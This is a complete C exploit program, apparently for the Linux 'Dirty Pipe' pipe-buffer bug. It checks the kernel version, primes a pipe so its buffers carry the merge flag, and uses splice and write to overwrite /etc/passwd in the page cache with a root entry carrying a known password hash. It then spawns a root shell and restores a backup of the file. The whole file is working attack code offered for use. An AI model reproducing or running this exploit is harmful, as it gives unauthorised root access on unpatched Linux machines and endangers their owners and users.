#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/stat.h>

#define FPATH "/etc/passwd"
#define PAGESIZE 4096


void sighandler(int signum){
	printf("\033[7;31m[!] An error occurred...aborting!\033[0m\n");
	exit(-1);
}

void create_backup(){
	FILE *f1 = fopen("/etc/passwd", "r");
	FILE *f2 = fopen("/tmp/passwd.bak", "w");

	if (f1 == NULL || f2 == NULL) abort();

	char c;
	while((c = fgetc(f1)) != EOF){
		fputc(c, f2);
	}
	fclose(f1); fclose(f2);

}
static int check_vuln(void){
	/* determine if the kernel version is vulnerable*/
	pid_t cpid;
	const char *command = "uname --kernel-release";
	char ver[23 + 1] = {0};
	static int pfd[2];
	char *vuln[] = {"5.16.11", "5.15.25", "5.10.102"};

	if (pipe(pfd)) abort();

	cpid = fork();

	if (!cpid){
		close(pfd[0]);
		dup2(pfd[1], STDOUT_FILENO);
		system(command);
		exit(1);
	}else{
		wait(NULL);
		read(pfd[0], ver, sizeof(ver));
		char *version = strtok(ver,"-");

		if (strverscmp("5.8.0", version) < 0){
			for(int ii = 0;ii <= 2;ii++){
				if (strcmp(vuln[ii], version) == 0){
					return 0;
				}
			}
			return 1;
		}else {return 0;}

	}
}


static void prepare_pipe(int pfd[2]){

	if (pipe(pfd)) abort();
	const unsigned pipe_size = fcntl(pfd[1], F_GETPIPE_SZ);
	char buffer[PAGESIZE];

	/*fill the pipe; each pipe_buffer will now have the flag*/
	for(unsigned ii = pipe_size; ii > 0;){
		unsigned n = ii > sizeof(buffer) ? sizeof(buffer) : ii;
		write(pfd[1], buffer, n);
		ii -= n;
	}

	/* this is used to drain all the pipe_buffer instances*/
	for(unsigned ii = pipe_size; ii > 0;){
		unsigned n = ii > sizeof(buffer) ? sizeof(buffer) : ii;
		read(pfd[0], buffer, n);
		ii -= n;
	}
}

void exploit_function(int pfd[2]){
	/* this is the function that is used to exploit the vulnerability :) */
	struct stat st;
	const char *filename = FPATH;
	const char data[] = "$1$/TjRb3V.$Rs42hVb5wYuZKf052D2Gv.:0:0:root:/root:/bin/bash\n";
	loff_t offset = 5;
	const loff_t end_offset = offset + (loff_t) strlen(data);

	create_backup();

	const int fd = open(filename, O_RDONLY);

	if (fd < 0){
		perror("\033[1;31m[!] Open file error\033[0m ");
		abort();
	}


	if (fstat(fd, &st)) abort();

	if (offset > st.st_size){
		fprintf(stderr, "offset is not inside the file\n");
		abort();
	}

	if (end_offset > st.st_size){
		fprintf(stderr, "Cannot write passed file size\n");
		abort();
	}

	--offset;

	ssize_t nbytes = splice(fd, &offset, pfd[1], NULL, 1, 0);
	if (nbytes < 0){
		perror("splice failed");
		abort();
	}

	if (!nbytes){
		fprintf(stderr, "short splice\n");
		abort();
	}

	/* the following write will not create a new pipe_buffer but it 
	will instead write into the page cache, since the PIPE_BUF_FLAG_CAN_MERGE 
	flag is set*/

	nbytes = write(pfd[1], data, strlen(data));

	if (nbytes < 0){
		perror("write failed\n");
		abort();
	}

	if ((ssize_t) nbytes < (ssize_t)strlen(data)){
		fprintf(stderr, "short write\n");
		abort();
	}

	printf("\033[0;32m[+] Success! Now log in as \033[7;33mroot:password\n");
	printf("\033[0m\n");

	char *argp[] = {"/bin/sh", "-c", "su -l root -c \"cp /tmp/passwd.bak /etc/passwd; /bin/bash\"", NULL};
	execve(argp[0], argp, NULL);

}

int main(int argc, char **argv){
	int pipe_fd[2];
	struct sigaction act;

	act.sa_handler = sighandler;
	sigaction(SIGABRT, &act, NULL);

	if (check_vuln()){
		/* Version is vulnerable --exploit it */
		fprintf(stdout, "\033[0;32m[+] Bingo..Version is vulnerable!\033[0m\n");
		prepare_pipe(pipe_fd);
		exploit_function(pipe_fd);
	}else{
		fprintf(stderr, "\033[0;31m[!] Version does not seem vulnerable");
		abort();
	}
	return 0;
}
